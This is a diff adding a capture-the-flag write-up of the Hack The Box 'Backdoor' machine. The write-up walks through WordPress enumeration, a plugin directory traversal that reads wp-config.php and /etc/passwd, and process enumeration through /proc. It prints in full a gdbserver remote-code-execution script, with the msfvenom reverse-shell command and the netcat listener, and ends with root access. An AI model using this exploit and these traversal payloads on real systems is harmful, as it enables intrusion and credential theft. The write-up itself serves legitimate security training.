@@ -482,6 +482,435 @@ Service detection performed. Please report any incorrect results at https://nmap
 <img src="/assets/images/img-backdoor/captura13.png">
 </p>
 
+<p>Now with nmap we are going to do a simple fuzzing to see potential routes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Tue Nov 23 20:18:33 2021 as: nmap --script http-enum -p80 -oN WebScan 10.129.109.254
+Nmap scan report for backdoor.htb (10.129.109.254)
+Host is up (0.043s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2
+|   /: WordPress version: 5.8.1
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+
+# Nmap done at Tue Nov 23 20:18:47 2021 -- 1 IP address (1 host up) scanned in 13.31 seconds
+
+</code></pre></div></div>
+
+<p>We can see a login page but we don’t have credentials at the moment.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura14.png">
+</p>
+
+<p>if we go to the blog section of the web page we see that there is a post published by the admin user so I deduce that in this web there is only one user who is the admin.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura15.png">
+</p>
+
+<p>With searchspliot tool I tried to search if there is any vulnerability in the version of wordpress that came with this machine, but I did not find anything interesting.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura16.png">
+</p>
+
+<p>Now what I did is apply fuzzing with <strong><em>wfuzz</em></strong> to find potential routes. I know I did fuzzing with nmap but nmap is not as powerful as wfuzz and wfuzz gives us more information.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura17.png">
+</p>
+
+<p>Another alternative to the wfuzz tool is <strong><em>gobuster</em></strong> which is made in go language and as you know go works well with sockets and connections.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura18.png">
+</p>
+
+<p>Using wfuzz and gobuster are almost the same routes that i found with nmap only the only interesting route i found is wp-content as it may contain plugins that are installed on this page, and we can find possible vulnerabilities but we will see that below.</p>
+
+<p>What I am going to do is with the tool <strong><em>WPscan</em></strong> we are going to scan this wordpress page to see if there are more plugins or themes that have installed and the possible vulnerabilities they have.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura19.png">
+</p>
+
+<p>This is a wpscan look like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[32m[+][0m URL: http://10.10.11.125/ [10.10.11.125]
+[32m[+][0m Started: Sun Nov 28 03:51:52 2021
+
+Interesting Finding(s):
+
+[32m[+][0m Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[32m[+][0m XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[32m[+][0m WordPress readme found: http://10.10.11.125/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[32m[+][0m WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
+ |  - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
+
+[32m[+][0m WordPress theme in use: twentyseventeen
+ | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
+ | Latest Version: 2.8 (up to date)
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
+ | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ | License: GNU General Public License v2 or later
+ | License URI: http://www.gnu.org/licenses/gpl-2.0.html
+ | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready, block-patterns
+ | Text Domain: twentyseventeen
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.8 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'
+
+
+[34m[i][0m No plugins Found.
+
+[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
+[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[32m[+][0m Finished: Sun Nov 28 03:51:56 2021
+[32m[+][0m Requests Done: 2
+[32m[+][0m Cached Requests: 34
+[32m[+][0m Data Sent: 606 B
+[32m[+][0m Data Received: 1.027 KB
+[32m[+][0m Memory used: 239.539 MB
+[32m[+][0m Elapsed time: 00:00:04
+</code></pre></div></div>
+<p>With the wpscan scan I did not find relevant information about the plugins that this page has. I could have done a more aggressive scan using the command <strong><em>wpscan –url http: //backdoor.htb –plugins-detection aggressive</em></strong> but the scan would take a long time.</p>
+
+<p>So what I did is to go in the path <strong><em>wp-content/plugins</em></strong> and I found a plugin that is installed.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura20.png">
+</p>
+
+<h2 id="exploitation-phase">Exploitation phase</h2>
+
+<p>When I opened the folder of this plugin I found the file “readme.txt” and that is where I could see the version of this plugin.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura21.png">
+</p>
+
+<p>Then with searchsploit we search if that have any exploit, and I found one specifically about the version that have installed in the wordpress and it is also a very critical one that is “Directory traversal”.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura22.png">
+</p>
+
+<p>Open the exploit and we can see that there is a specific path that is vulnerable to directory traversal.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura23.png">
+</p>
+
+<p>When I go to the path I installed the wordpress configuration file which is <strong><em>wp-config.php</em></strong> and we can see that we have a username and password for the database and more information about the server.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura24.png">
+</p>
+
+<p>What I did is to try in the login page with admin user to see if the password that was in the configuration file was valid also to access with the admin account and the password didt’nt work.</p>
+
+<p>So what I did is to save the database credentials in a file.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura25.png">
+</p>
+
+<p>Then what I did is try using the traversal dirictory to see if it would let me view the file <strong><em>/etc/passwd</em></strong> to see the users that exist on the victim machine. and we see that it works and there is a user named <strong><em>user</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura26.png">
+</p>
+
+<p>Then I tried to test if it would let me view the content of the directory “/user/home/.ssh/id_rsa” to see if it has the id_rsa key and so I could access via ssh on port 22, but it would not let me view anything.</p>
+
+<p>Then I remembered that port 1337 was open but at the time of the port scan I could not see which service was running, so to find out which service is running on port 1337 we can use lfi.</p>
+
+<p>using burpsuite we are going to use it as a proxy to intercept the request and sent it in the <strong><em>intruder</em></strong> to manipulate it and send it to the server. and here what we are going to do is use lfi through the path <strong><em>/proc</em></strong>, basically this path contains information about the processes that are running on the system. and we are going to use the path <strong><em>/proc / pid / cmdline</em></strong> that contains commands to start processes. here the <strong><em>pid</em></strong> will be a variable number</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura27.png">
+</p>
+
+<p>And in the payload section we will specify that the type of payload will be <strong><em>numeric **</em>. and in **<em>payload option</em></strong> I will specify that it generates the number of payloads in the range 900-1000.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura28.png">
+</p>
+
+<p>This process we can do it to with wfuzz with the command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
+</code></pre></div></div>
+
+<p>We click <strong><em>attack</em></strong> to start the process. and in the response part we can see the processes that it is executing in the command part in the system.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura29.png">
+</p>
+
+<p>And boom!!! i found it in the port 1337 its running gdbserver that is a linux debugger.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura30.png">
+</p>
+
+<p>Using searchsploit, I wanted to find out if there was any gdbserver exploit, but fortunately I didn’t find anything.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura31.png">
+</p>
+
+<p>Then searching in google i found an gdbserver exploit that allows me to RCE witch is a python script.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura32.png">
+</p>
+
+<p>So this is the script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
+# Date: 2021-11-21
+# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
+# Vendor Homepage: https://www.gnu.org/software/gdb/
+# Software Link: https://www.gnu.org/software/gdb/download/
+# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)
+</span>
+<span class="c1">#!/usr/bin/env python3
+</span>
+
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">help</span> <span class="o">=</span> <span class="n">f</span><span class="s">'''
+Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;
+
+Example:
+- Victim's gdbserver   -&gt;  10.10.10.200:1337
+- Attacker's listener  -&gt;  10.10.10.100:4444
+
+1. Generate shellcode with msfvenom:
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
+
+2. Listen with Netcat:
+$ nc -nlvp 4444
+
+3. Run the exploit:
+$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
+'''</span>
+
+
+<span class="k">def</span> <span class="nf">checksum</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span>
+    <span class="k">return</span> <span class="n">f</span><span class="s">'{res:2x}'</span>
+
+
+<span class="k">def</span> <span class="nf">ack</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">'+'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s">'${s}#{checksum(s)}'</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">ack</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'qSupported:multiprocess+;qRelocInsn+;qvCont+;'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'!'</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'vCont;s'</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">arch</span><span class="p">,</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[!] ERROR: Unexpected response. Try again later'</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">'10'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found x64 arch'</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">[:</span><span class="n">pc</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">'0*'</span><span class="p">)])</span>
+        <span class="n">pc</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">+</span> <span class="n">addr</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">'08'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found x86 arch'</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">+</span> <span class="n">addr</span>
+
+    <span class="n">hex_length</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] Sending payload'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">f</span><span class="s">'M{addr},{hex_length}:{payload}'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'vCont;c'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">help</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="nb">hex</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'[!] ERROR: File {file} not found'</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Connected to target. Preparing exploit'</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[*] Pwned!! Check your listener'</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+
+</code></pre></div></div>
+<p>Inside the script it tells us the instructions that we must follow, first it tells us to generate a payload with <strong><em>msfvenom</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura33.png">
+</p>
+
+<p>Then with netcat we ara going to listen on the port 4444 and then execute the exploit specifying the victim machine ip and the payload that we generate with msfvenom.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura34.png">
+</p>
+
+<p>And as we can see we have a connection and we are as the user <strong><em>user</em></strong>, and we are going to indicate that we want a pseudo console.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura35.png">
+</p>
+
+<p>If we want another way to report a pseudo console we can do it using python.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura38.png">
+</p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>And with this command I want the remote shell to be the size of my terminal and that it can do ctrl + c and not get out of the session.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura36.png">
+</p>
+
+<p>let’s export two environment variables.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura37.png">
+</p>
+
+<p>And i found the first flag.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura39.png">
+</p>
+
+<p>Ok now i need to access as root for this i am going to test if it works for me with the <em>** screen **</em> command. and if it lets me login as root.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura40.png">
+</p>
+
+<p>And we can see tha second flag to submit in the htb.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura41.png">
+</p>
+
+<p>And with the credentials of the database that we had saved we can use it to access in the database.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura42.png">
+</p>
+
+<p>We can see the databases that are created.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura43.png">
+</p>
+
+<p>We can access the wordpress database and here we can enter the <strong><em>wp-users</em></strong> table to see the users and passwords.</p>
+
+<p align="center">
+<img src="/assets/images/img-backdoor/captura44.png">
+</p>
 
         
       </section>
